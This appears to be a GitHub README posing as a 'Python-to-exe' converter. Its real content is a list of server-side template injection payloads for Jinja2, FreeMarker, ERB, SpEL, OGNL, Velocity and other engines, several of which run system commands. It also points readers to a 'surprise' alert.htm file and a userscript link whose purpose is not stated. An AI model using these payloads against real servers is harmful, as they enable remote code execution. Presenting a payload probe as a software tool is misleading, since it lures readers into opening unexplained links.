# 🚀 Python-to-exe

> Convert your Python scripts to standalone executables!

---

## 🎉 **[⭐ CLICK HERE FOR A SURPRISE! ⭐](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)**

### Alternative Links:
- 🌐 [Web Version](https://bearertoken1.github.io/Python-to-exe/)
- 📜 [Userscript](https://github.com/bearertoken1/Python-to-exe/raw/main/github-alert.user.js)
- 💬 [Discussions](../../discussions)
- 📖 [Wiki](../../wiki)

---

## SSTI Payload Tests (Template Injection):

<!-- Jinja2 SSTI -->
{{ 7 * 7 }}

<!-- Flask SSTI -->
{{ config }}

<!-- Django SSTI -->
{{ settings }}

<!-- Mako SSTI -->
<% print("hi bearert0ken") %>

<!-- Velocity SSTI -->
#set($x = 1 + 1)
$x

<!-- FreeMarker SSTI -->
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("alert('hi bearert0ken')")}

<!-- Thymeleaf SSTI -->
[[${7*7}]]

<!-- Groovy SSTI -->
<%= 7*7 %>

<!-- Ruby ERB SSTI -->
<%= system("echo hi bearert0ken") %>

<!-- Smarty SSTI -->
{php}echo "hi bearert0ken";{/php}

<!-- Handlebars SSTI -->
{{#if this}}hi bearert0ken{{/if}}

<!-- Nunjucks SSTI -->
{% set x = 7*7 %}{{ x }}

<!-- Pug/Jade SSTI -->
- var x = 7*7

<!-- Twig SSTI -->
{{ range(1, 10)|join(',') }}

<!-- Liquid SSTI -->
{% for i in (1..5) %}{{ i }}{% endfor %}

<!-- Expression Language (Java) -->
${7*7}

<!-- SpEL (Spring) -->
T(java.lang.Runtime).getRuntime().exec('calc')

<!-- OGNL (Struts) -->
(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)

<!-- Velocity Payload -->
#set($rt = $class.forName("java.lang.Runtime"))#set($chr = $class.forName("java.lang.Character"))#set($str = $class.forName("java.lang.String"))

---

## Features
- Convert Python to EXE
- One-click deployment
- **And a special surprise!**

---

## Try it out!

The surprise awaits you above! ☝️
